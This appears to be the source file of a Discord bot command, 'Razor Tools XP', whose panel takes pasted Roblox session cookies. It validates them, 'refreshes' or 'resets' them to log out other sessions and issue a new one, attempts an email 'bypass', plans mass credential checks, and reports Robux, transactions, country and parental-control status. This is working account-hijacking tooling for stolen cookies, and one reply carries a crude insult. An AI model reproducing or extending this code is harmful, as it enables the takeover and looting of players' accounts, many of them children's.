import {
  ActionRowBuilder,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  type MessageComponentInteraction,
  type ModalSubmitInteraction,
  MessageFlags,
  type ChatInputCommandInteraction,
  SlashCommandBuilder,
  ButtonBuilder,
  ButtonStyle,
} from 'discord.js';
import type { Command } from './types';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildBaseEmbed,
  buildAccountEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import {
  runLoginAction,
  runRefreshAction,
  runResetAction,
  runClearAction,
} from '../../lib/actions';

const modalSessions = new Map<string, { action: string }>();
const noEmailSessions = new Map<string, { cookie: string }>();

export function buildPanelEmbed() {
  return buildBaseEmbed(
    '✧ 𝐑𝐚𝐳𝐨𝐫 𝐓𝐨𝐨𝐥𝐬 𝐗𝐏 ✧',
    '──── ּ ֶָ֢.\n' +
    '⭑ 𝑷𝒊𝒍𝒊𝒉 𝑭𝒊𝒕𝒖𝒓 𝑫𝒊𝒃𝒂𝒘𝒂𝒉! / 𝑪𝒉𝒐𝒐𝒔𝒆 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔 𝑩𝒆𝒍𝒐𝒘!\n' +
    '⭑ 𝑫𝒊𝒃𝒖𝒕𝒖𝒉𝒌𝒂𝒏 𝑫𝒂𝒕𝒂 𝑳𝒐𝒈𝒊𝒏 / 𝑳𝒐𝒈𝒊𝒏 𝑪𝒓𝒆𝒅𝒆𝒏𝒕𝒊𝒂𝒍𝒔 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅.\n' +
    '⭑ 𝑶𝒑𝒕𝒊𝒐𝒏𝒔 𝑹𝒆𝒔𝒖𝒍𝒕 𝑺𝒆𝒏𝒅𝒆𝒅 𝑻𝒐 : 𝑺𝒆𝒓𝒗𝒆𝒓 / 𝑫𝑴\n' +
    '──── ּ ֶָ֢.\n' +
    '✧ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨:\n' +
    '• 𝙇𝙤𝙜𝙞𝙣 – 𝘾𝙝𝙚𝙘𝙠 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙄𝙣𝙛𝙤 \n' +
    '• 𝙍𝙚𝙛𝙧𝙚𝙨𝙝 – 𝙍𝙚𝙛𝙧𝙚𝙨𝙝𝙞𝙣𝙜 𝘾𝙤𝙤𝙠𝙞𝙚 \n' +
    '• 𝙍𝙚𝙨𝙚𝙩 – 𝙇𝙤𝙜𝙤𝙪𝙩 𝙊𝙩𝙝𝙚𝙧𝙨 & 𝙍𝙚𝙘𝙞𝙚𝙫𝙚 𝙉𝙚𝙬 𝘾𝙤𝙤𝙠𝙞𝙚 \n' +
    '• 𝘽𝙮𝙥𝙖𝙨𝙨 – 𝙀𝙢𝙖𝙞𝙡𝙨 𝙍𝙚𝙢𝙤𝙫𝙞𝙣𝙜 \n' +
    '• 𝘾𝙝𝙚𝙘𝙠 – 𝘿𝙞𝙨𝙖𝙗𝙡𝙚𝙙 (𝙒.𝙄.𝙋)\n' +
    '• 𝘾𝙝𝙚𝙘𝙠 𝙑2 – 𝘿𝙞𝙨𝙖𝙗𝙡𝙚𝙙 (𝙒.𝙄.𝙋)\n' +
    '• 𝘾𝙡𝙚𝙖𝙧 – 𝘾𝙡𝙚𝙖𝙧 𝘾𝙤𝙤𝙠𝙞𝙚𝙨 \n' +
    '────────────────────────────',
    'Razor Tools On Top!'
  );
}

export function buildPanelSelect() {
  const select = new StringSelectMenuBuilder()
    .setCustomId('panel_select')
    .setPlaceholder('Choose?')
    .addOptions(
      new StringSelectMenuOptionBuilder()
        .setLabel('🔐 Login / Check')
        .setValue('login')
        .setDescription('Account Check'),
      new StringSelectMenuOptionBuilder()
        .setLabel('🔄 Refresh Cookie')
        .setValue('refresh')
        .setDescription('Refresh Cookie'),
      new StringSelectMenuOptionBuilder()
        .setLabel('🔄 Reset Cookie')
        .setValue('reset')
        .setDescription('Reset Current Cookie'),
      new StringSelectMenuOptionBuilder()
        .setLabel('⚡ Bypass')
        .setValue('bypass')
        .setDescription('Attempt Gmail Bypassing'),
      new StringSelectMenuOptionBuilder()
        .setLabel('📂 Mass Check (Cookies)')
        .setValue('check')
        .setDescription('W.I.P'),
      new StringSelectMenuOptionBuilder()
        .setLabel('📂 Mass Check V2 (USN:PW)')
        .setValue('checkv2')
        .setDescription('Use /checkv2'),
      new StringSelectMenuOptionBuilder()
        .setLabel('🧹 Clear Cookie')
        .setValue('clear')
        .setDescription('Clear Cookie Format')
    );
  return new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(select);
}

const data = new SlashCommandBuilder()
  .setName('panel')
  .setDescription('Open?')
  .setDefaultMemberPermissions('0') as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.reply({
    embeds: [buildPanelEmbed()],
    components: [buildPanelSelect()],
  });
}

async function handleSelect(interaction: MessageComponentInteraction): Promise<void> {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== 'panel_select') return;

  const action = interaction.values[0];
  const userId = interaction.user.id;

  if (action === 'check' || action === 'checkv2') {
    const commandName = action === 'check' ? '/check' : '/checkv2';
    await interaction.reply({
      content: `Dah dibilangin W.I.P Ngeyel kontol`,
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  const modal = new ModalBuilder()
    .setCustomId(`panel_modal_${action}_${userId}`)
    .setTitle(`Razor Tools – ${action.charAt(0).toUpperCase() + action.slice(1)}`);

  let fields: TextInputBuilder[] = [];

  if (action === 'clear') {
    const cookieInput = new TextInputBuilder()
      .setCustomId('cookie')
      .setLabel('Insert The Cookies!')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true)
      .setPlaceholder('Insert here...');
    fields.push(cookieInput);
  } else if (action === 'bypass') {
    const cookieInput = new TextInputBuilder()
      .setCustomId('cookie')
      .setLabel('Insert The Cookies!')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true)
      .setPlaceholder('Insert here...');
    fields.push(cookieInput);
    
  } else {
    const cookieInput = new TextInputBuilder()
      .setCustomId('cookie')
      .setLabel('Insert The Cookies!')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true)
      .setPlaceholder('Insert here...');
    fields.push(cookieInput);
  }

  const deliveryInput = new TextInputBuilder()
    .setCustomId('delivery')
    .setLabel('Send To S/D? (S - SERVER | D - DM)')
    .setStyle(TextInputStyle.Short)
    .setRequired(true)
    .setValue('S')
    .setPlaceholder('S or D');
  fields.push(deliveryInput);

  const rows = fields.map(f => new ActionRowBuilder<TextInputBuilder>().addComponents(f));
  modal.addComponents(...rows);

  modalSessions.set(`${action}_${userId}`, { action });

  await interaction.showModal(modal);
  const freshSelect = buildPanelSelect();
  await interaction.message.edit({ components: [freshSelect] }).catch(() => {});
}

async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
  const userId = interaction.user.id;
  const parts = interaction.customId.split('_');
  const action = parts[2];
  const sessionKey = `${action}_${userId}`;
  const session = modalSessions.get(sessionKey);
  if (!session) {
    await interaction.reply({ content: 'Session expired.', flags: MessageFlags.Ephemeral });
    return;
  }

  let cookie = '';
  try {
    cookie = interaction.fields.getTextInputValue('cookie') || '';
  } catch {}

  const deliveryRaw = interaction.fields.getTextInputValue('delivery').toUpperCase().trim();
  const delivery = (deliveryRaw === 'D') ? 'dm' : 'server';

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  async function sendResult(content: any) {
    if (delivery === 'dm') {
      try {
        await interaction.user.send(content);
        await interaction.editReply({ content: '✅ Result sent to your DMs.' });
      } catch {
        await interaction.editReply(content);
      }
    } else {
      await interaction.editReply(content);
    }
  }

  try {
    let result;
    switch (action) {
      case 'login':
        result = await runLoginAction(cookie);
        break;
      case 'refresh':
        result = await runRefreshAction(cookie);
        if (result.success && result.newCookie) {
          const id = Math.random().toString(36).slice(2, 10);
          const row = buildCopyButtons(id, 'refresh', result.newCookie, delivery === 'dm');
          await sendResult({ embeds: [result.embed], components: [row] });
          modalSessions.delete(sessionKey);
          return;
        }
        break;
      case 'reset':
        result = await runResetAction(cookie);
        if (result.success && result.newCookie) {
          const id = Math.random().toString(36).slice(2, 10);
          const row = buildCopyButtons(id, 'reset', result.newCookie, delivery === 'dm');
          await sendResult({ embeds: [result.embed], components: [row] });
          modalSessions.delete(sessionKey);
          return;
        }
        break;
      case 'bypass': {
        const validation = await Roblox.validateCookie(cookie);
        if (!validation.valid) {
          const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
          await sendResult({ embeds: [embed] });
          modalSessions.delete(sessionKey);
          return;
        }

        const email = await Roblox.fetchEmailInfo(cookie);
        if (!email.verified) {
          const embed = buildBaseEmbed(
            '𖣐 No Email Detected',
            `✧ **Account:** ${validation.username}\n` +
            `────\n` +
            `⭑ No verified email found.\n` +
            `⭑ You can reauthenticate (reset cookie) to get a fresh session.\n` +
            `⭑ Your credentials were not logged.`
          );
          const sessionId = Math.random().toString(36).slice(2, 10);
          noEmailSessions.set(sessionId, { cookie });
          setTimeout(() => noEmailSessions.delete(sessionId), 600000);
          const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
            new ButtonBuilder()
              .setCustomId(`bypass_reauth_${sessionId}`)
              .setLabel('🔄 Reauth (Reset Cookie)')
              .setStyle(ButtonStyle.Primary)
          );
          await sendResult({ embeds: [embed], components: [row] });
          modalSessions.delete(sessionKey);
          return;
        }
        // Email exists – show account info
        const userAge = await Roblox.getUserAge(validation.userId!);
        const ageStr = `Created ${userAge.createdYear} (${userAge.days}D) - ${await Roblox.fetchAgeGroup(cookie)}`;
        const robux = await Roblox.fetchRobux(cookie, String(validation.userId!));
        const summary = await Roblox.fetchTransactionTotals(cookie, String(validation.userId!));
        const country = await Roblox.fetchCountry(cookie);
        const parental = await Roblox.fetchParentalControls(cookie);
        const thumb = await Roblox.fetchAvatarThumbnail(String(validation.userId!));
        const embed = buildAccountEmbed(
          validation.username!,
          validation.displayName || null,
          validation.userId!,
          ageStr,
          robux,
          summary,
          country,
          `✅ Verified: \`${email.verified}\``,
          parental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
          thumb
        );
        await sendResult({ embeds: [embed] });
        modalSessions.delete(sessionKey);
        return;
      }
      case 'clear':
        result = await runClearAction(cookie);
        if (result.success && result.cleanedCookie) {
          const id = Math.random().toString(36).slice(2, 10);
          const row = buildCopyButtons(id, 'clear', result.cleanedCookie, delivery === 'dm');
          await sendResult({ embeds: [result.embed], components: [row] });
          modalSessions.delete(sessionKey);
          return;
        }
        break;
      default:
        await sendResult({ embeds: [buildErrorEmbed('✧ **Unknown Action**\n────\n⭑ Something went wrong.')] });
        modalSessions.delete(sessionKey);
        return;
    }
    await sendResult({ embeds: [result.embed] });
  } catch (err: any) {
    logger.error({ err }, 'Panel modal error');
    await sendResult({ embeds: [buildErrorEmbed('✧ **Error**\n────\n⭑ An unexpected error occurred.')] });
  }

  modalSessions.delete(sessionKey);
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  const customId = interaction.customId;
  if (customId.startsWith('bypass_reauth_')) {
    const id = customId.split('_')[2];
    const session = noEmailSessions.get(id);
    if (!session) {
      await interaction.reply({ content: 'Session expired.', flags: MessageFlags.Ephemeral });
      return;
    }
    const result = await runResetAction(session.cookie);
    if (result.success && result.newCookie) {
      const newId = Math.random().toString(36).slice(2, 10);
      const row = buildCopyButtons(newId, 'reset', result.newCookie, false);
      await interaction.reply({ embeds: [result.embed], components: [row], flags: MessageFlags.Ephemeral });
    } else {
      await interaction.reply({ embeds: [result.embed], flags: MessageFlags.Ephemeral });
    }
    noEmailSessions.delete(id);
    return;
  }

}

import { resetCommand } from './reset';
import { clearCommand } from './clear';
import { bypassCommand } from './bypass';
import { checkCommand } from './check';
import { refreshCommand } from './refresh';

export const panelCommand: Command = { data, execute, handleSelect, handleButton, handleModal };